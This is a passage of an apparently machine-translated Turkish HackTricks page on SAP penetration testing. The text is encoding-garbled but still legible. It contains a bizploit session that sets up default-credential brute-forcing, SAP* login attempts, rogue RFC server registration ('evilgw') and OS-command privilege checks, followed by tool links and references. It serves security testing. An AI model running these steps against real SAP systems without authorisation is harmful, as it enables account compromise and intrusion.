* KeÅŸif aÅŸamasÄ±nda bizploit betiÄŸinde `start` komutunu Ã§alÄ±ÅŸtÄ±rmadan Ã¶nce, gÃ¼venlik aÃ§Ä±ÄŸÄ± deÄŸerlendirmesi yapmak iÃ§in aÅŸaÄŸÄ±dakileri de ekleyebilirsiniz:
```text
bizploit> plugins
bizploit/plugins> vulnassess all
bizploit/plugins> vulnassess config bruteLogin
bizploit/plugins/vulnassess/config:bruteLogin> set type defaultUsers
bizploit/plugins/vulnassess/config:bruteLogin> set tryHardcodedSAPStar True
bizploit/plugins/vulnassess/config:bruteLogin> set tryUserAsPwd True
bizploit/plugins/vulnassess/config:bruteLogin> back
bizploit/plugins> vulnassess config registerExtServer
bizploit/plugins/vulnassess/config:registerExtServer> set tpname evilgw
bizploit/plugins/vulnassess/config:registerExtServer> back
bizploit/plugins> vulnassess config checkRFCPrivs
bizploit/plugins/vulnassess/config:checkRFCPrivs> set checkExtOSCommands True
bizploit/plugins/vulnassess/config:checkRFCPrivs> back
bizploit/plugins> vulnassess config icmAdmin
bizploit/plugins/vulnassess/config:icmAdmin> set adminURL /sap/admin
bizploit/plugins/vulnassess/config:icmAdmin> back
bizploit/plugins> start
bizploit/plugins> back
bizploit> start
```
# DiÄŸer Test Ä°Ã§in KullanÄ±ÅŸlÄ± AraÃ§lar

* [PowerSAP](https://github.com/airbus-seclab/powersap) - SAP gÃ¼venliÄŸini deÄŸerlendirmek iÃ§in Powershell aracÄ±
* [Burp Suite](https://portswigger.net/burp) - dizin fuzzing ve web gÃ¼venliÄŸi deÄŸerlendirmeleri iÃ§in olmazsa olmaz
* [pysap](https://github.com/SecureAuthCorp/pysap) - SAP aÄŸ protokol paketlerini oluÅŸturmak iÃ§in Python kÃ¼tÃ¼phanesi
* [https://github.com/gelim/nmap-erpscan](https://github.com/gelim/nmap-erpscan) - nmap'in SAP/ERP'yi tespit etmesine yardÄ±mcÄ± olur

## Referanslar

* [SAP Penetration Testing Using Metasploit](http://information.rapid7.com/rs/rapid7/images/SAP%20Penetration%20Testing%20Using%20Metasploit%20Final.pdf)
* [https://github.com/davehardy20/SAP-Stuff](https://github.com/davehardy20/SAP-Stuff) - Bizploit'i yarÄ± otomatik hale getiren bir script
* [SAP NetWeaver ABAP gÃ¼venlik yapÄ±landÄ±rmasÄ± bÃ¶lÃ¼m 3: Uygulamaya eriÅŸim iÃ§in varsayÄ±lan ÅŸifreler](https://erpscan.com/press-center/blog/sap-netweaver-abap-security-configuration-part-2-default-passwords-for-access-to-the-application/)
* [SAP gÃ¼venliÄŸi ile ilgili ABAP iÅŸlem kodlarÄ± listesi](https://wiki.scn.sap.com/wiki/display/Security/List+of+ABAP-transaction+codes+related+to+SAP+security)
* [SAP Portal'Ä± KÄ±rmak](https://erpscan.com/wp-content/uploads/presentations/2012-HackerHalted-Breaking-SAP-Portal.pdf)
* [En ilginÃ§ 10 SAP gÃ¼venlik aÃ§Ä±ÄŸÄ± ve saldÄ±rÄ±](https://erpscan.com/wp-content/uploads/presentations/2012-Kuwait-InfoSecurity-Top-10-most-interesting-vulnerabilities-and-attacks-in-SAP.pdf)
* [Bizploit ile SAP ekosistemlerinin gÃ¼venliÄŸini deÄŸerlendirme: KeÅŸif](https://www.onapsis.com/blog/assessing-security-sap-ecosystems-bizploit-discovery)
* [https://www.exploit-db.com/docs/43859](https://www.exploit-db.com/docs/43859)
* [https://resources.infosecinstitute.com/topic/pen-stesting-sap-applications-part-1/](https://resources.infosecinstitute.com/topic/pen-stesting-sap-applications-part-1/)
* [https://github.com/shipcod3/mySapAdventures](https://github.com/shipcod3/mySapAdventures)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** bizi **takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.**

</details>
{% endhint %}
